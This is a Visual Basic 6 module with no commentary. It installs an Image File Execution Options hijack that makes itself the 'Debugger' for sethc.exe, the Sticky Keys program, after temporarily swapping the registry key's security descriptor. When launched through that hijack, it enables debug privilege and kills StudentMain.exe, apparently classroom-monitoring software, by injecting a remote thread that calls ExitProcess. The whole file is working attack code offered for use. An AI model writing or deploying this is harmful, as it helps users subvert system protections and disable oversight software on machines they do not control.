Attribute VB_Name = "Module1"
Option Explicit

Private Const PROCESS_ALL_ACCESS As Long = 2035711
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Const TH32CS_SNAPPROCESS = &H2&
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Type PROCESSENTRY32
    dwSize  As Long
    cntUseage  As Long
    th32ProcessID  As Long
    th32DefaultHeapID  As Long
    th32ModuleID  As Long
    cntThreads  As Long
    th32ParentProcessID  As Long
    pcPriClassBase  As Long
    swFlags  As Long
    szExeFile  As String * 1024
End Type
Private Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function Process32Next Lib "kernel32" (ByVal hSapshot As Long, lppe As PROCESSENTRY32) As Long
Private Declare Function lstrcmpi Lib "kernel32" Alias "lstrcmpiA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
Private Declare Function BuildSecurityDescriptor Lib "advapi32.dll" Alias "BuildSecurityDescriptorA" (ByVal pOwner As Long, ByVal pGroup As Long, ByVal cCountOfAccessEntries As Long, ByVal pListOfAccessEntries As Long, ByVal cCountOfAuditEntries As Long, ByVal pListOfAuditEntries As Long, pOldSD As Long, pSizeNewSD As Long, pNewSD As Long) As Long
Private Declare Function LocalFree Lib "kernel32" (ByVal hMem As Long) As Long
Private Const REG_SZ = 1                         ' Unicode nul terminated string
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Const DACL_SECURITY_INFORMATION = &H4&
Private Declare Function RegGetKeySecurity Lib "advapi32.dll" (ByVal hKey As Long, ByVal SecurityInformation As Long, pSecurityDescriptor As Byte, lpcbSecurityDescriptor As Long) As Long
Private Declare Function RegSetKeySecurity Lib "advapi32.dll" (ByVal hKey As Long, ByVal SecurityInformation As Long, pSecurityDescriptor As Any) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RtlAdjustPrivilege Lib "ntdll.dll" (ByVal RtlPrivilege As Long, ByVal RtlEnable As Long, ByVal RtlThread As Long, ByRef RtlEnabled As Long) As Long

Public Sub Main()
    If VBA.Command = "" Then
        Dim hKeyIFEO As Long
        RegOpenKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options", hKeyIFEO
        Dim OldSD() As Byte
        Dim SDBufferSize As Long
        ReDim OldSD(0)
        RegGetKeySecurity hKeyIFEO, DACL_SECURITY_INFORMATION, OldSD(0), SDBufferSize
        ReDim OldSD(SDBufferSize - 1)
        RegGetKeySecurity hKeyIFEO, DACL_SECURITY_INFORMATION, OldSD(0), SDBufferSize
        Dim SD As Long
        BuildSecurityDescriptor 0, 0, 0, 0, 0, 0, ByVal 0, SDBufferSize, SD
        RegSetKeySecurity hKeyIFEO, DACL_SECURITY_INFORMATION, ByVal SD
        LocalFree SD
        Dim hKey As Long
        RegOpenKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", hKey
        If hKey = 0 Then
            RegCreateKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", hKey
        End If
        If RegSetValueEx(hKey, "Debugger", 0&, REG_SZ, ByVal Replace(App.Path & "\" & App.EXEName & ".exe", "\\", "\"), LenB(Replace(App.Path & "\" & App.EXEName & ".exe", "\\", "\"))) = 0 Then
            MsgBox "安装映像劫持成功", vbInformation
        End If
        RegCloseKey hKey
        RegSetKeySecurity hKeyIFEO, DACL_SECURITY_INFORMATION, OldSD(0)
        RegCloseKey hKeyIFEO
    Else
        RtlAdjustPrivilege 20, 1, 0, 0
        Dim Proc As PROCESSENTRY32
        Dim hSnap As Long
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        Proc.dwSize = Len(Proc)
        Process32First hSnap, Proc
        Do
            If lstrcmpi(Proc.szExeFile, "StudentMain.exe") = 0 Then
                Dim hProcess As Long
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, Proc.th32ProcessID)
                CreateRemoteThread hProcess, 0, 0, GetProcAddress(GetModuleHandle("kernel32"), "ExitProcess"), 0, 0, ByVal 0
                CloseHandle hProcess
                Exit Do
            End If
        Loop While Process32Next(hSnap, Proc)
        CloseHandle hSnap
        Form1.Show
        Form1.WindowState = 0
    End If
End Sub
